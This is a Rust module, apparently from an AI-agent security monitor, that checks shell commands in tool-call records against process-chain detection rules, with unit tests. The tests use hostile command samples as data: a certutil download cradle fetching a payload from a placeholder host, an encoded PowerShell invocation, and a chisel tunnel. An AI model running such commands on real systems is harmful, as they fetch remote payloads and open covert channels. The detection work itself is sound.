//! Non-production process-chain evaluation over canonical Tool evidence.
//!
//! Parsed command relationships stay private matcher working state. This
//! module never constructs canonical Process observations.

use std::collections::BTreeSet;

use telltale_rules::process_chain::{
    CompiledProcessChainRules, ProcessChainContext, ProcessChainDetection, ProcessObservation,
};
use telltale_schema::observation::{
    CanonicalObservationV2, FactProvenance, JsonValue, ObservationBody, ObservationStage,
};

use super::classification::finding_kind_for_detection_class;
use super::{
    Confidence, CorrelationScope, DetectionError, DetectorIdentity, DetectorKind, DetectorResult,
    EvaluationStatus, FindingMetadata, Severity,
};

const ELIGIBLE_TOOL_STAGES: [ObservationStage; 4] = [
    ObservationStage::ToolProposed,
    ObservationStage::ToolRequested,
    ObservationStage::ToolExecutionStarted,
    ObservationStage::ToolExecutionCompleted,
];

/// Evaluates command-bearing canonical Tool evidence without production wiring,
/// source access, lifecycle suppression, correlation, or Event projection.
pub(crate) fn evaluate_tool_process_chains(
    rules: &CompiledProcessChainRules,
    observation: &CanonicalObservationV2,
    context: &ProcessChainContext,
) -> Result<Vec<DetectorResult>, DetectionError> {
    let mut results = Vec::new();
    for process_input in command_derived_process_matcher_inputs(observation) {
        for detection in rules.evaluate_with_context(&process_input, context) {
            results.push(normalize_match(&detection, observation)?);
        }
    }
    // Detector identity, not command-surface order, owns output ordering.
    results.sort_by(|left, right| {
        left.detector()
            .id()
            .cmp(right.detector().id())
            .then_with(|| left.dedupe_key().cmp(&right.dedupe_key()))
    });
    // Every result here has the same supporting observation, kind, version,
    // match surface, and selector context. The detector ID plus matcher-owned
    // dedupe key therefore distinguishes their Signal identities. Collapse
    // only duplicate identities created when distinct command candidates match
    // the same rule; semantic rule deduplication remains matcher-owned.
    results.dedup_by(|left, right| {
        left.detector().id() == right.detector().id() && left.dedupe_key() == right.dedupe_key()
    });
    Ok(results)
}

/// Adapts Tool command text to the existing matcher's input type. Returned
/// values are derived interpretation only, not canonical observations or
/// directly observed operating-system process facts.
fn command_derived_process_matcher_inputs(
    observation: &CanonicalObservationV2,
) -> Vec<ProcessObservation> {
    command_candidates(observation)
        .into_iter()
        .flat_map(crate::process_chain::observations_from_command_line)
        .collect()
}

fn command_candidates(observation: &CanonicalObservationV2) -> Vec<&str> {
    if !ELIGIBLE_TOOL_STAGES.contains(&observation.stage()) {
        return Vec::new();
    }
    let ObservationBody::Tool(tool) = observation.body() else {
        return Vec::new();
    };

    let mut seen = BTreeSet::new();
    let mut candidates = Vec::new();

    add_candidate(
        &mut seen,
        &mut candidates,
        observation
            .facets()
            .get("command.text")
            .and_then(|facet| match facet.value() {
                JsonValue::String(value) => Some(value.as_str()),
                _ => None,
            }),
    );
    add_candidate(
        &mut seen,
        &mut candidates,
        tool.searchable_arguments().filter(|_| {
            observation
                .fact_metadata()
                .get("tool.searchable_arguments")
                .is_some_and(|metadata| metadata.provenance() == FactProvenance::Reported)
        }),
    );
    add_candidate(
        &mut seen,
        &mut candidates,
        match tool.arguments() {
            Some(JsonValue::String(value)) => Some(value.as_str()),
            _ => None,
        },
    );
    candidates
}

fn add_candidate<'a>(
    seen: &mut BTreeSet<&'a str>,
    candidates: &mut Vec<&'a str>,
    candidate: Option<&'a str>,
) {
    let Some(candidate) = candidate.filter(|value| !value.trim().is_empty()) else {
        return;
    };
    if seen.insert(candidate) {
        candidates.push(candidate);
    }
}

fn normalize_match(
    detection: &ProcessChainDetection,
    observation: &CanonicalObservationV2,
) -> Result<DetectorResult, DetectionError> {
    let detector = DetectorIdentity::new(DetectorKind::ProcessChain, &detection.rule_id)?
        .with_rule_version(1)?;
    let techniques = detection
        .mitre_attack_techniques
        .iter()
        .map(|value| normalize_attack_technique(value))
        .collect::<Result<Vec<_>, _>>()?;
    let metadata = FindingMetadata::new(
        finding_kind_for_detection_class(&detection.detection_class)?,
        &detection.rule_category,
        severity(&detection.severity)?,
    )?
    .with_risk_points(detection.score)?
    .with_confidence(confidence(&detection.confidence)?)
    .with_techniques(techniques)?
    .with_correlation_scope(CorrelationScope::Process)
    .with_dedupe_key(&detection.dedup_key)?;

    DetectorResult::evaluated(
        detector,
        EvaluationStatus::EvaluatedMatch,
        None,
        Some(observation),
        metadata,
        observation.capability_context().cloned(),
        Vec::new(),
    )?
    .with_match_surface("text")
}

fn severity(value: &str) -> Result<Severity, DetectionError> {
    match value {
        "informational" => Ok(Severity::Informational),
        "low" => Ok(Severity::Low),
        "medium" => Ok(Severity::Medium),
        "high" => Ok(Severity::High),
        "critical" => Ok(Severity::Critical),
        _ => Err(DetectionError::InvalidMetadata),
    }
}

fn confidence(value: &str) -> Result<Confidence, DetectionError> {
    match value {
        "low" => Ok(Confidence::Low),
        "medium" => Ok(Confidence::Medium),
        "high" => Ok(Confidence::High),
        _ => Err(DetectionError::InvalidMetadata),
    }
}

fn normalize_attack_technique(value: &str) -> Result<String, DetectionError> {
    let value = value.strip_prefix("attack:").unwrap_or(value);
    let bytes = value.as_bytes();
    let valid = (bytes.len() == 5 || bytes.len() == 9)
        && bytes[0] == b'T'
        && bytes[1..5].iter().all(u8::is_ascii_digit)
        && (bytes.len() == 5 || (bytes[5] == b'.' && bytes[6..9].iter().all(u8::is_ascii_digit)));
    if valid {
        Ok(format!("attack:{value}"))
    } else {
        Err(DetectionError::InvalidMetadata)
    }
}

#[cfg(test)]
mod tests {
    use std::collections::{BTreeMap, BTreeSet};

    use telltale_rules::process_chain::{
        ProcessChainContext, load_default_process_chain_rules, load_process_chain_rules,
    };
    use telltale_schema::observation::{
        CanonicalObservationV2, CapabilityAvailability, CapabilityContext, CapabilityId,
        CorrelationId, FactMetadata, FactProvenance, Fidelity, IngestionMode, JsonValue,
        MessageObservation, MessageRole, ObservationBody, ObservationFamily, ObservationStage,
        ObservedAt, ProcessObservation as CanonicalProcess, SemanticFacet, SourceProvenance,
        ToolObservation, ToolStatus,
    };

    use super::*;
    use crate::v2::{FindingKind, NonEvaluationReason};

    const OBSERVED_AT: &str = "2026-09-17T12:00:00Z";

    fn source(native_id: &str) -> SourceProvenance {
        SourceProvenance::new(
            IngestionMode::Harness,
            "synthetic",
            "process-chain-v2-tests",
            Fidelity::FullNative,
        )
        .unwrap()
        .with_native_id(native_id)
        .unwrap()
    }

    fn metadata(provenance: FactProvenance) -> FactMetadata {
        FactMetadata::new(
            provenance,
            telltale_schema::observation::Sensitivity::Normal,
        )
        .unwrap()
    }

    fn tool(
        stage: ObservationStage,
        command_text: Option<&str>,
        searchable_arguments: Option<&str>,
        arguments: Option<JsonValue>,
        tool_name: &str,
        native_id: &str,
    ) -> CanonicalObservationV2 {
        let has_arguments = arguments.is_some();
        let mut body = ToolObservation::new().with_name(tool_name).unwrap();
        if let Some(arguments) = arguments {
            body = body.with_arguments(arguments);
        }
        if let Some(searchable) = searchable_arguments {
            body = body.with_searchable_arguments(searchable).unwrap();
        }
        if stage == ObservationStage::ToolExecutionCompleted {
            body = body.with_reported_status(ToolStatus::Succeeded);
        }
        if stage == ObservationStage::ToolResultReturned {
            body = body.with_result(JsonValue::string("synthetic result"));
        }

        let mut builder = CanonicalObservationV2::builder(
            ObservationBody::Tool(body),
            stage,
            ObservedAt::new(OBSERVED_AT).unwrap(),
            source(native_id),
        )
        .session_id(CorrelationId::source_reported("session:process-v2").unwrap())
        .capability_context(
            CapabilityContext::new()
                .with_override(CapabilityId::ToolCall, CapabilityAvailability::Supported),
        )
        .fact_metadata("tool.name", metadata(FactProvenance::Reported));
        if has_arguments {
            builder = builder.fact_metadata("tool.arguments", metadata(FactProvenance::Reported));
        }
        if searchable_arguments.is_some() {
            builder = builder.fact_metadata(
                "tool.searchable_arguments",
                metadata(FactProvenance::Reported),
            );
        }
        if stage == ObservationStage::ToolExecutionCompleted {
            builder =
                builder.fact_metadata("tool.reported_status", metadata(FactProvenance::Reported));
        }
        if stage == ObservationStage::ToolResultReturned {
            builder = builder.fact_metadata("tool.result", metadata(FactProvenance::Reported));
        }
        if let Some(command_text) = command_text {
            builder = builder
                .facet(
                    "command.text",
                    SemanticFacet::new(JsonValue::string(command_text)),
                )
                .unwrap()
                .fact_metadata("command.text", metadata(FactProvenance::Parsed));
        }
        builder.build().unwrap()
    }

    fn requested_command(command: &str, native_id: &str) -> CanonicalObservationV2 {
        tool(
            ObservationStage::ToolRequested,
            Some(command),
            None,
            None,
            "shell",
            native_id,
        )
    }

    fn default_results(command: &str, native_id: &str) -> Vec<DetectorResult> {
        evaluate_tool_process_chains(
            &load_default_process_chain_rules().unwrap(),
            &requested_command(command, native_id),
            &ProcessChainContext::default(),
        )
        .unwrap()
    }

    fn result<'a>(results: &'a [DetectorResult], id: &str) -> &'a DetectorResult {
        results
            .iter()
            .find(|result| result.detector().id() == id)
            .unwrap_or_else(|| panic!("missing {id}"))
    }

    #[test]
    fn explicit_parent_child_uses_the_tool_observation_identity() {
        let rules = load_default_process_chain_rules().unwrap();
        let observation = requested_command("cmd.exe /c whoami", "explicit");
        let results =
            evaluate_tool_process_chains(&rules, &observation, &ProcessChainContext::default())
                .unwrap();
        let matched = result(&results, "procchain.discovery.cmd_whoami");

        assert_eq!(
            matched.evaluation_status(),
            EvaluationStatus::EvaluatedMatch
        );
        assert_eq!(matched.detector().kind(), DetectorKind::ProcessChain);
        assert_eq!(matched.detector().rule_version(), Some(1));
        assert_eq!(matched.observation_ids(), [observation.observation_id()]);
        assert_eq!(matched.session_id(), Some("session:process-v2"));
        assert_eq!(matched.correlation_scope(), CorrelationScope::Process);
        assert_eq!(
            matched
                .capability_context()
                .expect("capability context")
                .resolve(CapabilityId::ToolCall),
            CapabilityAvailability::Supported
        );
        assert_eq!(observation.kind(), ObservationFamily::Tool);
        assert_ne!(observation.stage(), ObservationStage::ProcessObserved);
    }

    #[test]
    fn standalone_command_indicator_uses_the_same_path() {
        let results = default_results("powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA", "standalone");
        let matched = result(&results, "procchain.execution.encoded_powershell");
        assert_eq!(matched.detector().kind(), DetectorKind::ProcessChain);
        assert_eq!(
            matched.evaluation_status(),
            EvaluationStatus::EvaluatedMatch
        );
    }

    #[test]
    fn zero_risk_match_materializes_an_ordinary_signal_and_finding() {
        let results = default_results("cmd.exe /c hostname", "informational");
        let matched = result(&results, "procchain.discovery.cmd_hostname");
        assert_eq!(matched.risk_points(), Some(0));
        assert_eq!(matched.severity(), Severity::Informational);
        assert_eq!(matched.finding_kind(), FindingKind::ThreatHunt);

        let signal = matched.signal().unwrap().expect("signal");
        let finding = signal.finding().expect("finding");
        assert_eq!(signal.risk_points(), Some(0));
        assert_eq!(finding.risk_points(), Some(0));
        assert_eq!(finding.detectors()[0].kind(), DetectorKind::ProcessChain);
        assert_eq!(finding.observation_ids(), matched.observation_ids());
    }

    #[test]
    fn inferred_parent_weakens_confidence_without_runtime_identity() {
        let rules = load_default_process_chain_rules().unwrap();
        let observation = tool(
            ObservationStage::ToolRequested,
            None,
            None,
            Some(JsonValue::string(
                "certutil -urlcache https://example.invalid/payload",
            )),
            "shell",
            "inferred",
        );
        let derived = command_derived_process_matcher_inputs(&observation);
        let input = derived
            .iter()
            .find(|input| input.child.normalized_name() == "certutil")
            .expect("derived matcher input");
        assert!(input.parent_inferred);
        assert_eq!(input.parent.normalized_name(), "cmd");
        assert_eq!(input.parent.pid, None);
        assert_eq!(input.child.pid, None);
        assert_eq!(input.source_event_id, None);

        let results =
            evaluate_tool_process_chains(&rules, &observation, &ProcessChainContext::default())
                .unwrap();
        assert_eq!(
            result(&results, "procchain.c2.certutil_download_cradle").confidence(),
            Some(Confidence::Medium)
        );
        assert_eq!(observation.kind(), ObservationFamily::Tool);
    }

    #[test]
    fn caller_context_softens_but_does_not_remove_a_match() {
        let rules = load_default_process_chain_rules().unwrap();
        let observation = requested_command("cmd.exe /c chisel", "context");
        let baseline =
            evaluate_tool_process_chains(&rules, &observation, &ProcessChainContext::default())
                .unwrap();
        let mut context = ProcessChainContext::default();
        context.approved_rmm_products.insert("chisel".to_owned());
        let softened = evaluate_tool_process_chains(&rules, &observation, &context).unwrap();

        let baseline = result(&baseline, "procchain.c2.cmd_chisel");
        let softened = result(&softened, "procchain.c2.cmd_chisel");
        assert_eq!(
            (baseline.risk_points(), baseline.severity()),
            (Some(85), Severity::Critical)
        );
        assert_eq!(
            (softened.risk_points(), softened.severity()),
            (Some(55), Severity::High)
        );
        assert_eq!(
            softened.evaluation_status(),
            EvaluationStatus::EvaluatedMatch
        );
    }

    #[test]
    fn command_line_gated_match_is_not_softened() {
        let rules = load_default_process_chain_rules().unwrap();
        let observation = requested_command(
            "cmd.exe /c certutil -urlcache https://example.invalid/payload",
            "gated",
        );
        let mut context = ProcessChainContext::default();
        context.approved_rmm_products.insert("certutil".to_owned());
        let results = evaluate_tool_process_chains(&rules, &observation, &context).unwrap();
        let matched = result(&results, "procchain.c2.certutil_download_cradle");
        assert_eq!(matched.risk_points(), Some(58));
        assert_eq!(matched.severity(), Severity::High);
    }

    #[test]
    fn authoritative_rule_dedup_winner_and_merged_techniques_are_normalized() {
        let rules = load_process_chain_rules(
            r#"
version: 1
description: synthetic dedupe
defaults: { enabled: true, risk_entity: host, suppression_window_seconds: 3600 }
categories:
  synthetic:
    detection_class: security_detection
    analytic_intent: alert
    investigation_fields: []
    falsepositives: []
rules:
  - { id: procchain.synthetic.weak, title: weak, category: synthetic, severity: low, score: 20, confidence: low, parent: cmd, child: whoami, mitre: [T1219], reason: weak }
  - { id: procchain.synthetic.strong, title: strong, category: synthetic, severity: high, score: 50, confidence: high, parent: cmd, child: whoami, mitre: [T1003.001], reason: strong }
standalone: []
correlations: []
"#,
        )
        .unwrap();
        let observation = requested_command("cmd.exe /c whoami", "dedupe");
        let results =
            evaluate_tool_process_chains(&rules, &observation, &ProcessChainContext::default())
                .unwrap();

        assert_eq!(results.len(), 1);
        assert_eq!(results[0].detector().id(), "procchain.synthetic.strong");
        assert_eq!(
            results[0].techniques(),
            ["attack:T1003.001", "attack:T1219"]
        );
    }

    #[test]
    fn attack_normalization_is_strict_and_malformed_pack_values_fail_closed() {
        assert_eq!(normalize_attack_technique("T1219").unwrap(), "attack:T1219");
        assert_eq!(
            normalize_attack_technique("T1003.001").unwrap(),
            "attack:T1003.001"
        );
        for malformed in ["T121", "t1219", "T1003.01", "T1003.001x", "not-attack"] {
            assert_eq!(
                normalize_attack_technique(malformed).unwrap_err(),
                DetectionError::InvalidMetadata
            );
        }

        let rules = load_process_chain_rules(
            r#"
version: 1
description: malformed technique
defaults: { enabled: true, risk_entity: host, suppression_window_seconds: 3600 }
categories:
  synthetic: { detection_class: security_detection, analytic_intent: alert, investigation_fields: [], falsepositives: [] }
rules:
  - { id: procchain.synthetic.invalid_attack, title: invalid, category: synthetic, severity: low, score: 20, confidence: low, parent: cmd, child: whoami, mitre: [invalid], reason: invalid }
standalone: []
correlations: []
"#,
        )
        .unwrap();
        assert_eq!(
            evaluate_tool_process_chains(
                &rules,
                &requested_command("cmd.exe /c whoami", "invalid-attack"),
                &ProcessChainContext::default(),
            )
            .unwrap_err(),
            DetectionError::InvalidMetadata
        );
    }

    #[test]
    fn unsupported_detection_class_fails_closed() {
        let rules = load_process_chain_rules(
            r#"
version: 1
description: unsupported class
defaults: { enabled: true, risk_entity: host, suppression_window_seconds: 3600 }
categories:
  synthetic: { detection_class: operational_health, analytic_intent: alert, investigation_fields: [], falsepositives: [] }
rules:
  - { id: procchain.synthetic.unsupported_class, title: invalid, category: synthetic, severity: low, score: 20, confidence: low, parent: cmd, child: whoami, mitre: [T1219], reason: invalid }
standalone: []
correlations: []
"#,
        )
        .unwrap();
        assert_eq!(
            evaluate_tool_process_chains(
                &rules,
                &requested_command("cmd.exe /c whoami", "unsupported-class"),
                &ProcessChainContext::default(),
            )
            .unwrap_err(),
            DetectionError::UnmappableRuleClass
        );
    }

    #[test]
    fn only_command_bearing_tool_evidence_is_eligible() {
        let rules = load_default_process_chain_rules().unwrap();
        let message = CanonicalObservationV2::builder(
            ObservationBody::Message(
                MessageObservation::new(MessageRole::User)
                    .with_content(JsonValue::string("cmd.exe /c whoami")),
            ),
            ObservationStage::MessageObserved,
            ObservedAt::new(OBSERVED_AT).unwrap(),
            source("message"),
        )
        .fact_metadata("message.role", metadata(FactProvenance::Reported))
        .fact_metadata("message.content", metadata(FactProvenance::Reported))
        .build()
        .unwrap();
        let name_only = tool(
            ObservationStage::ToolRequested,
            None,
            None,
            None,
            "cmd.exe /c whoami",
            "name-only",
        );
        let result_stage = tool(
            ObservationStage::ToolResultReturned,
            Some("cmd.exe /c whoami"),
            Some("cmd.exe /c whoami"),
            Some(JsonValue::string("cmd.exe /c whoami")),
            "shell",
            "result-stage",
        );
        let object_arguments = tool(
            ObservationStage::ToolRequested,
            None,
            None,
            Some(JsonValue::Object(BTreeMap::from([(
                "command".to_owned(),
                JsonValue::string("cmd.exe /c whoami"),
            )]))),
            "shell",
            "object",
        );
        let parsed_searchable = CanonicalObservationV2::builder(
            ObservationBody::Tool(
                ToolObservation::new()
                    .with_name("shell")
                    .unwrap()
                    .with_searchable_arguments("cmd.exe /c whoami")
                    .unwrap(),
            ),
            ObservationStage::ToolRequested,
            ObservedAt::new(OBSERVED_AT).unwrap(),
            source("parsed-searchable"),
        )
        .fact_metadata("tool.name", metadata(FactProvenance::Reported))
        .fact_metadata(
            "tool.searchable_arguments",
            metadata(FactProvenance::Parsed),
        )
        .build()
        .unwrap();

        for observation in [
            &message,
            &name_only,
            &result_stage,
            &object_arguments,
            &parsed_searchable,
        ] {
            assert!(
                evaluate_tool_process_chains(&rules, observation, &ProcessChainContext::default(),)
                    .unwrap()
                    .is_empty()
            );
        }
    }

    #[test]
    fn identical_command_surfaces_are_parsed_once() {
        let observation = tool(
            ObservationStage::ToolRequested,
            Some("cmd.exe /c whoami"),
            Some("cmd.exe /c whoami"),
            Some(JsonValue::string("cmd.exe /c whoami")),
            "shell",
            "candidate-dedupe",
        );
        assert_eq!(command_candidates(&observation), ["cmd.exe /c whoami"]);
        assert_eq!(
            command_derived_process_matcher_inputs(&observation).len(),
            1
        );
    }

    #[test]
    fn distinct_command_surfaces_are_evaluated_without_duplicate_result_identity() {
        let observation = tool(
            ObservationStage::ToolRequested,
            Some("cmd.exe /c whoami"),
            Some("cmd.exe /c hostname"),
            Some(JsonValue::string("cmd /c whoami /all")),
            "shell",
            "distinct-candidates",
        );
        let results = evaluate_tool_process_chains(
            &load_default_process_chain_rules().unwrap(),
            &observation,
            &ProcessChainContext::default(),
        )
        .unwrap();
        let ids = results
            .iter()
            .map(|result| result.detector().id())
            .collect::<BTreeSet<_>>();
        assert!(ids.contains("procchain.discovery.cmd_whoami"));
        assert!(ids.contains("procchain.discovery.cmd_hostname"));
        assert_eq!(
            results
                .iter()
                .filter(|result| result.detector().id() == "procchain.discovery.cmd_whoami")
                .count(),
            1,
            "one Tool observation must not emit duplicate Signal identity"
        );
        let signal_ids = results
            .iter()
            .map(|result| result.signal().unwrap().unwrap().signal_id().to_owned())
            .collect::<BTreeSet<_>>();
        assert_eq!(signal_ids.len(), results.len());
        assert!(
            results
                .windows(2)
                .all(|pair| { pair[0].detector().id() <= pair[1].detector().id() })
        );
    }

    #[test]
    fn lifecycle_stage_policy_is_source_neutral_and_excludes_results() {
        let rules = load_default_process_chain_rules().unwrap();
        for (stage, id) in [
            (ObservationStage::ToolProposed, "proposed"),
            (ObservationStage::ToolRequested, "requested"),
            (ObservationStage::ToolExecutionStarted, "started"),
            (ObservationStage::ToolExecutionCompleted, "completed"),
        ] {
            let observation = tool(stage, Some("cmd.exe /c whoami"), None, None, "shell", id);
            assert!(
                evaluate_tool_process_chains(
                    &rules,
                    &observation,
                    &ProcessChainContext::default(),
                )
                .unwrap()
                .iter()
                .any(|result| result.detector().id() == "procchain.discovery.cmd_whoami")
            );
        }
        let returned = tool(
            ObservationStage::ToolResultReturned,
            Some("cmd.exe /c whoami"),
            None,
            None,
            "shell",
            "returned",
        );
        assert!(
            evaluate_tool_process_chains(&rules, &returned, &ProcessChainContext::default())
                .unwrap()
                .is_empty()
        );
    }

    #[test]
    fn process_chain_materialization_debug_does_not_expose_command_evidence() {
        let marker = "synthetic-secret-marker-C:\\private\\token.txt";
        let command = format!("cmd.exe /c whoami {marker}");
        let results = default_results(&command, "privacy");
        let matched = result(&results, "procchain.discovery.cmd_whoami");
        let signal = matched.signal().unwrap().expect("signal");
        let finding = signal.finding().expect("finding");
        for debug in [
            format!("{matched:?}"),
            format!("{signal:?}"),
            format!("{finding:?}"),
        ] {
            assert!(!debug.contains(marker), "debug leaked command evidence");
            assert!(!debug.contains("private"), "debug leaked a path");
        }
    }

    #[test]
    fn canonical_process_observations_are_not_consumed() {
        let observation = CanonicalObservationV2::builder(
            ObservationBody::Process(CanonicalProcess::new().with_operation("exec").unwrap()),
            ObservationStage::ProcessObserved,
            ObservedAt::new(OBSERVED_AT).unwrap(),
            source("direct-process"),
        )
        .fact_metadata("process.operation", metadata(FactProvenance::Observed))
        .build()
        .unwrap();
        assert!(
            evaluate_tool_process_chains(
                &load_default_process_chain_rules().unwrap(),
                &observation,
                &ProcessChainContext::default(),
            )
            .unwrap()
            .is_empty()
        );
    }

    #[test]
    fn only_process_chain_is_newly_runtime_supported() {
        let metadata = FindingMetadata::new(
            FindingKind::Informational,
            "synthetic",
            Severity::Informational,
        )
        .unwrap();
        let process_chain = DetectorResult::new(
            DetectorIdentity::new(DetectorKind::ProcessChain, "procchain.synthetic").unwrap(),
            EvaluationStatus::EvaluatedNoMatch,
            metadata.clone(),
        );
        assert!(process_chain.is_ok());

        for kind in [
            DetectorKind::Sequence,
            DetectorKind::Correlation,
            DetectorKind::Imported,
            DetectorKind::Baseline,
            DetectorKind::GuardModel,
        ] {
            assert_eq!(
                DetectorResult::new(
                    DetectorIdentity::new(kind, "synthetic.unsupported").unwrap(),
                    EvaluationStatus::EvaluatedNoMatch,
                    metadata.clone(),
                )
                .unwrap_err(),
                DetectionError::UnsupportedDetectorKind
            );
            assert!(
                DetectorResult::not_evaluated(
                    DetectorIdentity::new(kind, "synthetic.unsupported").unwrap(),
                    NonEvaluationReason::IneligibleInput,
                    metadata.clone(),
                )
                .is_ok()
            );
        }
    }
}
